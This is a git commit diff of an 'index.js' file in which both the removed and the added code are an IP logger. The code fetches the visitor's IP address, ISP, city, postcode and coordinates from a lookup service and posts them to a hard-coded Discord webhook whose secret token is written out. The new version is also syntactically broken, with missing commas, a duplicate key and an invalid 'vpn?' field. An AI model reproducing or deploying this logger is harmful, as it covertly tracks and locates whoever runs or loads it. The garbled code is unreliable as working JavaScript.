f94d2ad01b3b63e4fae7f76e3c0364418e86c0e8
49rip <146723162+49rip@users.noreply.github.com>
2023-10-05 16:36:42 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,52 +1,32 @@
 
-<!DOCTYPE javascript>
-var webHookUrl = "https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";
+const axios = require("axios");
 
-const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('https://ip-api.com/json/');
-    const data = await response.json();
 
+axios
+  .get("https://wtfismyip.com/json")
+  .then(response => {
+    const ipInfo = response.data;
+
+   
+    const webhookData = {
+      ip: ipInfo.YourFuckingIPAddress,
+      şehir: ipInfo.City,
+      bölge: ipInfo.RegionName,
+      ülke: ipInfo.Country
+      adress: ipInfo.YourFuckingLocation
+    host_ismi: ipInfo.YourFuckingHostname
+     isp: ipInfo.YourFuckingISP
+     vpn?: ipInfo.YourFuckingTorExit
+     şehir: ipInfo.YourFuckingCity
     
-    var ip = data.query;
-
-    var provider = data.org + " (" + data.as + ")";
-
-    var timezone = data.timezone;
-    var country = data.country;
-    var countryCode = data.countryCode.toLowerCase()
-    var region = data.region + " (" + data.regionName + ")";
-    var city = data.city;
-
-    var zip = data.zip;
-    var lat = data.lat;
-    var lon = data.lon;
-
-    // Open POST Request
-    var postRequest = new XMLHttpRequest();
-    postRequest.open("POST", webHookUrl);
-
-    postRequest.setRequestHeader('Content-type', 'application/json');
-
-    var params = {
-        username:   "IP Log",
-        avatar_url: "",
-        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
-                    + "`" + ip + "`" + 
-                    "\n \n__**:telephone: Provider:**__ \n" 
-                    + provider + 
-                    "\n \n__**:map: Timezone:**__ \n" 
-                    + timezone + 
-                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
-                    + country + " - " + region + 
-                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
-                    + zip + " " + city +
-                    "\n \n__**:round_pushpin: Location:**__ \n" 
-                    + "**Longitude:** " + lon + "\n"
-                    + "**Latitude:** " + lat
-    }
-
-    postRequest.send(JSON.stringify(params));
-
-}
-
-request();
+    // Webhook post isteği gönderme
+    axios.post("<https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh>", webhookData).then(response => {
+      console.log("Webhook isteği başarıyla gönderildi.");
+    }).catch(error => {
+      console.error("Webhook isteği gönderme hatası:", error);
+    });
+  })
+  .catch(error => {
+    console.error("IP bilgisi alınırken hata:", error);
+  });
+```
